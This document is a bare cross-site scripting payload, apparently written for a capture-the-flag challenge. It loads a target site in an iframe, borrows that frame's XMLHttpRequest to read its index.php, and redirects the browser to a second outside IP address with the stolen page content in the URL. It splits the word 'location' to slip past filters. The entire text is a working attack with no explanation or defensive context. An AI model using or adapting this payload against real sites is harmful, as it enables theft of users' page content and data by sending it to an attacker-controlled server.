<iframe id="bendawang" src="http://106.75.103.149:8888/"></iframe>
<script>
  window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; 
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://106.75.103.149:8888/index.php ", false);
  xhr.send();
  a=xhr.responseText;
  window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a);
</script>
